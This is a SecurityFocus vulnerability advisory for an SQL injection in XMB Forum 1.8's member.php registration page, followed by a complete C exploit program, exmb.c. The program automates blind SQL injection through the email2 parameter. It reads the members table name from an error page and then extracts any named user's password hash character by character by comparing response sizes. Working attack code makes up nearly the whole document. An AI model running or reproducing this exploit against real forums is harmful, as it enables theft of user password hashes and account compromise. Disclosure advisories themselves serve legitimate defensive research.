source: http://www.securityfocus.com/bid/7406/info

XMB Forum Member.PHP has been reported prone to an SQL injection vulnerability, under certain conditions.

The SQL injection vulnerability has been reported to affect the registration page of XMB Forum. This is reportedly due to insufficient sanitization of externally supplied data that is used to construct SQL queries. A remote attacker may take advantage of this issue to inject malicious data into SQL queries, possibly resulting in modification of query logic.

It should be noted that although this vulnerability has been reported to affect XMB Forum version 1.8 previous versions might also be affected. 

/*
 * exmb.c - XMB 1.8 Partagium Final exploit
 *
 * Steals password hashes from any registered user
 * 
 * http://www.bbugs.org
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define USERAGENT	"Mozilla/4.75"
#define SCRIPT		"member.php"

void safe_send(int, void *, size_t, int);
void safe_recv(int, void *, size_t, int);
void resolve_host(struct sockaddr *, char *);
char *get_members_table(struct sockaddr_in);
int get_err_page_size(struct sockaddr_in);
void usage();
void do_it();

char hexchars[]= {
	'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'
};

char *argv0, *target_host, *user, *path;
unsigned short target_port, beginchar, endchar;

int main(int argc, char **argv)
{
	int ch;

	argv0 = argv[0];
	user = path = NULL;
	target_port = 80;
	beginchar = 1;
	endchar = 32;

	while ((ch = getopt(argc, argv, "b:e:hp:u:")) != -1) {
		
		switch (ch) {
		case 'b':
			beginchar = atoi(optarg);
			break;
		case 'e':
			endchar = atoi(optarg);
			break;
		case 'p':
			path = optarg;
			break;
		case 'u':
			user = optarg;
			break;
		case 'h':
		case '?':
		default:
			usage();
		}
	}

	argc-=optind;
	argv+=optind;

	if (argc > 1)
		target_port = atoi(argv[1]);
	if (argc > 0)
		target_host = argv[0];
	else
		usage();
	
	if (!path) {
		printf("you must specify a path\n");
		exit(1);
	}
	if (!user) {
		printf("you must specify an user\n");
		exit(1);
	}

	do_it();
	
	return 0;
}

void do_it()
{
	char *table;
	struct sockaddr_in sa;
	int s, c, spread, pos, i, err_sz, sz;
	char buf[31337],  email2[20000], hash[33], *p;

	resolve_host((struct sockaddr *)&sa, target_host);
	sa.sin_port = htons(target_port);

	printf("\nAttacking %s:%d (%s)\n\n", target_host, target_port,
		inet_ntoa(sa.sin_addr));
	
	printf("Using script path: %s/%s\n", path, SCRIPT);
	err_sz = get_err_page_size(sa);
	printf("Got error page size: %d bytes\n", err_sz);

	table = get_members_table(sa);
	printf("Got members table: %s\n", table);

	printf("This may take a while...\n\n");

	printf("* %s's password hash: ", user);
	fflush(stdout);

	for (c=beginchar; c<=endchar; c++) {
		
		for (spread=8,pos=0; spread; spread/=2) {
			sprintf(email2, "+and(");

			for (i=0; i<spread; i++) {
				sprintf(email2, "%s+mid(%s.password,%d,1)=char(%d)", email2, table, c,
					hexchars[pos+i]);
															               
				if (i<spread-1)
					strcat(email2, "+or");
				else
					strcat(email2, ")");
			}
	
			if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
				perror("socket");
				exit(1);
			}
	
			if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
				perror("connect");
				exit(1);
			}
		
			sprintf(buf,
				"GET %s/%s?action=reg&regsubmit=1&email2=%s&username=%s HTTP/1.1\r\n"
				"Host: %s\r\n"
				"Content-type: application/x-www-form-urlencoded\r\n"
				"User-Agent: %s\r\n"
				"Connection: close\r\n\r\n",
				path, SCRIPT, email2, user, target_host, USERAGENT);

			safe_send(s, buf, strlen(buf), 0);
			memset(buf,0,sizeof(buf));
			safe_recv(s, buf, sizeof(buf), 0);

			if (!(p = strstr(buf, "\r\n\r\n"))) {
				printf("something failed\n");
				exit(1);
			}
			sz = strlen(p)-4;
			if (sz == err_sz) {
				if (spread == 1) {
					hash[c] = hexchars[pos];
				}
			}
			else {
				if (spread == 1) {
					hash[c] = hexchars[pos+spread];
				}
				pos += spread;
			}
			close(s);
		}
		printf("%c", hash[c]);
		fflush(stdout);
	}
	printf("\n\nDone.\n");
}

char *get_members_table(struct sockaddr_in sa)
{
	static char members_table[64];
	char buf[1024], *p, *q;
	int s;

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket");
		exit(1);
	}
	if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("connect");
		exit(1);
	}
	sprintf(buf,
		"GET %s/%s?action=reg&regsubmit=1&email1=+FROM HTTP/1.1\r\n"
		"Host: %s\r\n"
		"Content-type: application/x-www-form-urlencoded\r\n"
		"User-Agent: %s\r\n"
		"Connection: close\r\n"
		"\r\n",
		path, SCRIPT, target_host, USERAGENT);
	safe_send(s, buf, strlen(buf), 0);
	safe_recv(s, buf, sizeof(buf), 0);
	
	if (!((p = strstr(buf, "FROM "))) || !((q = strstr((p+5), " WHERE")))) {
		printf("cant get members table. maybe wrong path?\n");
		exit(1);
	}
	*q = '\0';
	strcpy(members_table, p+5);

	close(s);
	return members_table;
}

int get_err_page_size(struct sockaddr_in sa)
{
	char buf[20000], *p;
	int s, sz;

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket");
		exit(1);
	}
	if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("connect");
		exit(1);
	}
	sprintf(buf,
		"GET %s/%s?action=reg&regsubmit=1&username=%s HTTP/1.1\r\n"
		"Host: %s\r\n"
		"Content-type: application/x-www-form-urlencoded\r\n"
		"User-Agent: %s\r\n"
		"Connection: close\r\n"
		"\r\n",
		path, SCRIPT, user, target_host, USERAGENT);
	safe_send(s, buf, strlen(buf), 0);
	safe_recv(s, buf, sizeof(buf), 0);

	if (!(p = strstr(buf, "\r\n\r\n"))) {
		printf("cant get error page\n");
		exit(1);
	}
	sz = strlen(p)-4;
	
	close(s);
	return sz;
}

void resolve_host(struct sockaddr *addr, char *hostname)
{
    struct hostent *hent;
	struct sockaddr_in *address;

	address = (struct sockaddr_in *)addr;
	bzero((void *)address, sizeof(struct sockaddr_in));

	hent = gethostbyname(hostname);
	if (hent) {
		address->sin_family = hent->h_addrtype;
		memcpy(&address->sin_addr, hent->h_addr, hent->h_length);
	}
	else {
		address->sin_family = AF_INET;
		address->sin_addr.s_addr = inet_addr(hostname);
		if (address->sin_addr.s_addr == -1) {
			printf("unknown host: %s\n", hostname);
			exit(1);
		}
	}
}

void safe_recv(int s, void *buf, size_t len, int flags)
{
    int ret, received=0;

	do {
		ret = recv(s,buf+received,len-received,flags);
		switch(ret) {
		case -1:
			perror("recv");
			exit(1);
		default:
			received+=ret;
		}
	} while(ret);
}

void safe_send(int s, void *buf, size_t len, int flags)
{
	int ret, sent=0;

	do {
		ret = send(s,buf+sent,len-sent,flags);
		switch(ret) {
		case -1:
			perror("send");
			exit(1);
		default:
			sent+=ret;
		}
	} while(ret);
}

void usage()
{
	fprintf(stderr,
		"Usage: %s <-p path> <-u user> [-b beginchar] [-e endchar] <host> [port]\n\n"
		, argv0);
	exit(1);
}